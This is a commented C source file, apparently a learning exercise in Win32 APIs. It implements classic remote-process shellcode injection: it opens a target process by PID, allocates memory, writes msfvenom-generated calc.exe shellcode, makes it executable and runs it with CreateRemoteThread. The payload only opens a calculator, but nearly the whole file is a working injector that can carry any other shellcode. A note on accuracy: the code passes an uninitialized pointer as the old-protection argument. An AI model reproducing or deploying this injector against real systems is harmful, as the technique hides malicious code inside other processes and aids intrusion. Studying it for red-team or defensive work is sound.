// We continue our exploration of Win32 APIs. We will begin with basic process injection. We will learn about OpenProcess(), VirtualAllocEx(), WriteProcessMemory(), VirtualProtectEx() and CreateRemoteThread().

#include <Windows.h>
#include <stdio.h>

// calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
unsigned char payload[] = 
{
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};
size_t payload_len = sizeof(payload);

int main(int argc, char* argv[]){

    if (argc < 2){
        printf("\n(-) Usage: ShellcodeInjection.exe <pid>");
        return EXIT_FAILURE;
    }

    DWORD PID = atoi(argv[1]); // We will take the PID as a command line argument. We use atoi to typecast it to an int
    HANDLE hProcess = OpenProcess( // We call openprocess which returns a handle to the target process.
        PROCESS_ALL_ACCESS,
        FALSE,
        PID
    );

    // Remeber that OpenProcess can return null if it cant open the process. So we need to check to make sure it isnt null
    if (hProcess == NULL) {
        printf("\n(-) Failed to get handle to process (%ld), error: %ld", PID, GetLastError());
        return EXIT_FAILURE;
    }

    // If hProcess isnt null, then we have a handle to the process
    printf("\n(+) Got handle to process (%ld)", PID);

    // Allocate memory in the target process. Returns teh baseAddress of allocated memory
    // We intially set the memory to read write and later we will change it to read execute
    LPVOID baseAddress = VirtualAllocEx(
        hProcess,
        NULL,
        payload_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    // If there is no base address, we failed to allocate memory
    if (baseAddress == NULL){
        printf("\n(-) Failed to allocate memory, error: %ld", GetLastError());

        CloseHandle(hProcess);

        return EXIT_FAILURE;
    }

    // otherwise we have allocated memory
    printf("\n(+) Allocated memory, Base Address: %ld", baseAddress); 

    // Writes data into memory starting at the specified base address
    // If it fails, we cleanup and exit
    if(!WriteProcessMemory(hProcess, baseAddress, payload, payload_len, NULL)){
        printf("\n(-) Failed to write process memory, error: %ld", GetLastError());

        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Otherwise, we succesfully wrote memory
    printf("\nCopied shellcode to memory. Base Address: %ld", baseAddress);

    // Change memory protection from READ WRITE to READ EXECUTE
    // If it fails, we exit
    PDWORD oldProtect; 
    if (!VirtualProtectEx(hProcess, baseAddress, payload_len, PAGE_EXECUTE_READ, oldProtect)){
        printf("\n(-) Failed to change memory protection, error: %ld", GetLastError());

        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Create a new thread to exec the payload
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)baseAddress,
        NULL,
        0,
        NULL
    );

    // If handle is null then we failed to create the thread
    if(hThread == NULL){
        printf("\n(-) Failed to create thread, error: %ld", GetLastError());

        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Otherwise we can proceed to wait for the thread to finish executing
    printf("\n(+) Created thread and began execution");
    WaitForSingleObject(hThread, INFINITE);

    printf("\n(+) Shellcode executed");
    printf("\n(+) Cleaning up...");


    // Close open handles
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}